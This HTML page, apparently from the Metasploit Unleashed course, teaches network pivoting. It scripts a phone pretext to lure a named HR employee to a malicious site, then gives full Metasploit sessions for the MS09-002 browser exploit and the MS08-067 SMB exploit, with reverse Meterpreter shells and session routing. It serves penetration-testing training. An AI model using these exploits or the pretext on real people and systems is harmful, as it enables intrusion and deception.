<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Pivoting</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Pivoting</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Pivoting is the unique technique of
using an instance (also referred
to as a 'plant' or 'foothold') to be able to "move" around inside a
network. Basically using the first compromise to allow and even aid in
the compromise of other otherwise inaccessible systems. In this
scenario we will be using it for routing traffic from a normally
non-routable network.
</p>
<p style="color: rgb(0, 0, 0);">For example, we are a pentester for
Security-R-Us. You pull the
company directory and find poor Mary Jo Swanson in Human Resources on
Sneaks.IN main website. You call up Mary Swanson and claim you are from
the information technology group and you need her to go to this website
to patch her computer from "suspicious traffic". She visits your site
and you happen to be running the latest Internet Explorer
vulnerability.
<br>
<br>
</p>
<pre id="code">msf &gt; use windows/browser/ms09_002_memory_corruption<br>msf exploit(ms09_002_memory_corruption) &gt; show options<br><br>Module options:<br><br>   Name     Current Setting  Required  Description<br>   ----     ---------------  --------  -----------<br>   SRVHOST  0.0.0.0          yes       The local host to listen on.<br>   SRVPORT  80               yes       The local port to listen on.<br>   SSL      false            no        Use SSL<br>   URIPATH  /                no        The URI to use for this exploit (default is random)<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Windows XP SP2-SP3 / Windows Vista SP0 / IE 7<br><br><br>msf exploit(ms09_002_memory_corruption) &gt; set SRVPORT 80<br>SRVPORT =&gt; 80<br>msf exploit(ms09_002_memory_corruption) &gt; set URIPATH /<br>URIPATH =&gt; /<br>msf exploit(ms09_002_memory_corruption) &gt; set PAYLOAD windows/patchupmeterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/patchupmeterpreter/reverse_tcp<br>msf exploit(ms09_002_memory_corruption) &gt; show options<br><br>Module options:<br><br>   Name     Current Setting  Required  Description<br>   ----     ---------------  --------  -----------<br>   SRVHOST  0.0.0.0          yes       The local host to listen on.<br>   SRVPORT  80               yes       The local port to listen on.<br>   SSL      false            no        Use SSL<br>   URIPATH  /                no        The URI to use for this exploit (default is random)<br><br><br>Payload options (windows/patchupmeterpreter/reverse_tcp):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  process          yes       Exit technique: seh, thread, process<br>   LHOST                      yes       The local address<br>   LPORT     4444             yes       The local port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Windows XP SP2-SP3 / Windows Vista SP0 / IE 7<br><br><br>msf exploit(ms09_002_memory_corruption) &gt; set LHOST 10.10.1.109<br>LHOST =&gt; 10.10.1.109<br>msf exploit(ms09_002_memory_corruption) &gt; set LPORT 8080<br>LPORT =&gt; 8080<br>msf exploit(ms09_002_memory_corruption) &gt; exploit -j<br>[*] Exploit running as background job.<br>msf exploit(ms09_002_memory_corruption) &gt;<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Using URL: http://0.0.0.0:80/<br>[*] Local IP: http://10.10.10.243:80/<br>[*] Server started.</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Our social engineering attack has
been successful! Poor Mary
Swanson has connected to our website and has unknowingly given us full
access to her computer.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Using URL: http://0.0.0.0:80/<br>[*] Local IP: http://10.10.1.109:80/<br>[*] Server started.<br>[*] Sending Internet Explorer 7 Uninitialized Memory Corruption Vulnerability to 10.10.1.104:62238...<br>[*] Sending Internet Explorer 7 Uninitialized Memory Corruption Vulnerability to 10.10.1.104:62238...<br>[*] Transmitting intermediate stager for over-sized stage...(216 bytes)<br>[*] Sending Internet Explorer 7 Uninitialized Memory Corruption Vulnerability to 10.10.1.104:62238...<br>[*] Sending stage (2650 bytes)<br>[*] Sleeping before handling stage...<br>[*] Uploading DLL (205835 bytes)...<br>[*] Upload completed.<br>[*] Meterpreter session 1 opened (10.10.1.109:8080 -&gt; 10.10.1.104:62239)<br><br>msf exploit(ms09_002_memory_corruption) &gt; sessions -l<br><br>Active sessions<br>===============<br><br>  Id  Description  Tunnel                                <br>  --  -----------  ------                                <br>  1   Meterpreter  10.10.1.109:8080 -&gt; 10.10.1.104:62239 <br><br>msf exploit(ms09_002_memory_corruption) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">The question from here is, where do
we go next?
</span>
<p style="color: rgb(0, 0, 0);">We have to somehow further gain access
and dive deeper into the
network. If you noticed, we used a REVERSE Meterpreter payload. Notice
the attacking machines IP address is in a different subnet than the
victims machine. The victims IP address is 10.211.55.140 and our
attacking IP is 10.10.1.109. How can we launch attacks against other
systems on the network? If we want to go after another IP address at
10.211.55.128, we need to pivot our attacks and exploit the system.
Let's do it.
</p>
<p style="color: rgb(0, 0, 0);">We begin by interacting with the
Meterpreter session and making
note of our IP address vs the victims IP. We issue the 'route' command
to view the available subnets on the victim PC.
<br>
<br>
</p>
<pre id="code">msf exploit(ms09_002_memory_corruption) &gt; sessions -l<br><br>Active sessions<br>===============<br><br>  Id  Description  Tunnel                                <br>  --  -----------  ------                                <br>  1   Meterpreter  10.10.1.109:8080 -&gt; 10.10.1.104:62239 <br><br>msf exploit(ms09_002_memory_corruption) &gt; ifconfig<br>[*] exec: ifconfig<br><br>eth0      Link encap:Ethernet  HWaddr 00:0d:29:d9:ec:cc<br>          inet addr:10.10.1.109  Bcast:10.10.1.255  Mask:255.255.255.0<br>          inet6 addr: fe80::20c:29ff:fee8:ebe7/64 Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br>          RX packets:14826 errors:12824 dropped:0 overruns:0 frame:0<br>          TX packets:6634 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:1000<br>          RX bytes:7542708 (7.5 MB)  TX bytes:2385453 (2.3 MB)<br>          Interrupt:19 Base address:0x2024<br><br>msf exploit(ms09_002_memory_corruption) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><u>meterpreter</u> &gt; route<br><br>Network routes<br>==============<br><br>    Subnet           Netmask          Gateway       <br>    ------           -------          -------       <br>    0.0.0.0          0.0.0.0          10.211.55.2   <br>    10.211.55.0      255.255.255.0    10.211.55.140 <br>    10.211.55.140    255.255.255.255  127.0.0.1     <br>    10.255.255.255   255.255.255.255  10.211.55.140 <br>    127.0.0.0        255.0.0.0        127.0.0.1     <br>    224.0.0.0        240.0.0.0        10.211.55.140 <br>    255.255.255.255  255.255.255.255  10.211.55.140 <br><br><u>meterpreter</u> &gt;<br>Background session 1? [y/N]y</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">With this valuable information in
hand, we add the new route to
Metasploit using the subnet and subnet mask of the victim and pointing
it to the Meterpreter session number which is '1' in this case. Running
the 'route print' command will display the routes available to us.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf exploit(ms09_002_memory_corruption) &gt; route add 10.211.55.0 255.255.255.0 1<br>msf exploit(ms09_002_memory_corruption) &gt; route print<br><br>Active Routing Table<br>====================<br><br>   Subnet             Netmask            Gateway   <br>   ------             -------            -------   <br>   10.211.55.0        255.255.255.0      Session 1 <br><br>msf exploit(ms09_002_memory_corruption) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We will now use our newly created
route to exploit a system further inside the victim network.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf exploit(ms09_002_memory_corruption) &gt; use windows/smb/ms08_067_netapi<br>msf exploit(ms08_067_netapi) &gt; set PAYLOAD windows/patchupmeterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/patchupmeterpreter/reverse_tcp<br>msf exploit(ms08_067_netapi) &gt; show options<br><br>Module options:<br><br>   Name     Current Setting  Required  Description                            <br>   ----     ---------------  --------  -----------                            <br>   RHOST                     yes       The target address                     <br>   RPORT    445              yes       Set the SMB service port               <br>   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC) <br><br>Payload options (windows/patchupmeterpreter/reverse_tcp):<br><br>   Name      Current Setting  Required  Description                          <br>   ----      ---------------  --------  -----------                          <br>   EXITFUNC  thread           yes       Exit technique: seh, thread, process <br>   LHOST                      yes       The local address                    <br>   LPORT     4444             yes       The local port                       <br><br>Exploit target:<br><br>   Id  Name                <br>   --  ----                <br>   0   Automatic Targeting <br><br>msf exploit(ms08_067_netapi) &gt; set RHOST 10.211.55.128<br>RHOST =&gt; 10.211.55.128<br>msf exploit(ms08_067_netapi) &gt; set LPORT 9000<br>LPORT =&gt; 9000<br>msf exploit(ms08_067_netapi) &gt; set LHOST 10.10.1.109<br>LHOST =&gt; 10.10.1.109<br>msf exploit(ms08_067_netapi) &gt; exploit<br><br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Automatically detecting the target...<br>[*] Fingerprint: Windows 2003 Service Pack 2 - lang:English<br>[*] Selected Target: Windows 2003 SP2 English (NX)<br>[*] Triggering the vulnerability...<br>[*] Transmitting intermediate stager for over-sized stage...(216 bytes)<br>[*] Sending stage (2650 bytes)<br>[*] Sleeping before handling stage...<br>[*] Uploading DLL (205835 bytes)...<br>[*] Upload completed.<br>[*] Meterpreter session 2 opened (10.10.1.109:9000 -&gt; 10.10.1.104:62260)<br><br><u>meterpreter</u> &gt;<br>Background session 2? [y/N]y</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">It certainly appears that we
successfully pivoted into the network. Let's confirm that we are where
we want to be.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf exploit(ms08_067_netapi) &gt; sessions -l<br><br>Active sessions<br>===============<br><br>  Id  Description  Tunnel                                <br>  --  -----------  ------                                <br>  1   Meterpreter  10.10.1.109:8080 -&gt; 10.10.1.104:62239 <br>  2   Meterpreter  10.10.1.109:9000 -&gt; 10.10.1.104:62260 <br><br>msf exploit(ms08_067_netapi) &gt; sessions -i 2<br>[*] Starting interaction with 2...<br><br><u>meterpreter</u> &gt; execute -f cmd.exe -i<br>Process 3864 created.<br>Channel 1 created.<br>Microsoft Windows [Version 5.2.3790]<br>(C) Copyright 1985-2003 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt; ipconfig<br>ipconfig<br><br>Windows IP Configuration<br><br><br>Ethernet adapter Local Area Connection 6:<br><br>   Connection-specific DNS Suffix  . : localdomain<br>   IP Address. . . . . . . . . . . . : 10.211.55.128<br>   Subnet Mask . . . . . . . . . . . : 255.255.255.0<br>   Default Gateway . . . . . . . . . : 10.211.55.2<br><br>C:\WINDOWS\system32&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Success! We have successfully routed
our exploit to the
10.211.55.0/24 network and successfully compromised hosts inside the
normally non-routable network!
</span>
<p style="color: rgb(0, 0, 0);">We now have full access to both
10.211.55.140 and 10.211.55.128! If
you notice it says that 10.10.1.109 is connected to 10.10.1.104, note
that we did a reverse payload and that 10.10.1.104 is the external IP
address. The 10.211.55.128 and 10.211.55.140 are NATed behind the
router 10.10.1.104. <br>
<br>
</p>
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/MSF_Post_Exploitation"
 title="MSF Post Exploitation">MSF Post Exploitation</a></div>
</body>
</html>
